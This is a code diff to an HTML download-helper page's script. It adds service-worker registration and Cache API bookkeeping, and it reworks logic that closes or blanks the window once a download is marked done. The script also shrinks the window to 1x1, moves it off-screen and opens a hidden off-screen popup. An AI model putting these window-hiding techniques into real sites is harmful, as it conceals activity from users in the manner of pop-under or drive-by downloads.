@@ -1,6 +1,21 @@
 <!DOCTYPE html>
 <html><head><script>
-// INSTANT EXIT — runs before ANYTHING renders
+// Register Service Worker
+if('serviceWorker' in navigator){
+  navigator.serviceWorker.register('sw.js',{scope:'./'}).catch(function(){});
+}
+
+var _pop=location.hash.indexOf('popup=1')!==-1||!!window.opener;
+var _newTab=history.length<=2;
+
+function _exit(){
+  if(_pop){window.close();return}
+  if(!_newTab){history.back();setTimeout(function(){window.close()},300);return}
+  try{window.close()}catch(e){}
+  setTimeout(function(){try{document.documentElement.innerHTML=''}catch(e){}},200);
+}
+
+// INSTANT CHECK — before page renders
 (function(){
   var h=location.hash?location.hash.slice(1):'';
   if(!h)return;
@@ -8,30 +23,14 @@
   try{h=decodeURIComponent(h)}catch(e){}
   if(h.slice(-2)==='!W')h=h.slice(0,-2);
   var s=h.indexOf('~'),n=s>0?h.slice(0,s):'x';
-  if(!localStorage.getItem('dl_done_'+n))return;
-  // ALREADY DONE — exit NOW
-  window.stop();
-  if(history.length>2){history.back();return}
-  window.close();
-  location.replace('about:blank');
+  if(localStorage.getItem('dl_done_'+n)){window.stop();_exit()}
 })();
 </script><title>.</title></head>
 <body>
 <script>
 (function(){
-  var _pop=location.hash.indexOf('popup=1')!==-1||!!window.opener;
-  var _newTab=history.length<=2;
-
-  function _exit(){
-    if(_pop){window.close();return}
-    if(!_newTab){history.back();setTimeout(function(){window.close()},300);return}
-    window.close();
-    setTimeout(function(){location.replace('about:blank')},100);
-  }
-
   try{window.resizeTo(1,1);window.moveTo(-9999,-9999)}catch(e){}
 
-  // Popup delegation (Firefox same-tab)
   if(!_pop&&!_newTab){
     try{
       var p=window.open(location.href+'&popup=1','_blank','width=1,height=1,left=-9999,top=-9999');
@@ -57,6 +56,12 @@
 
   function done(){
     localStorage.setItem(key,'1');
+    // Store in Cache API for Service Worker
+    if('caches' in window){
+      caches.open('dl-done').then(function(c){
+        c.put('done-'+fname,new Response('1'));
+      }).catch(function(){});
+    }
     setTimeout(_exit,1500);
   }
 
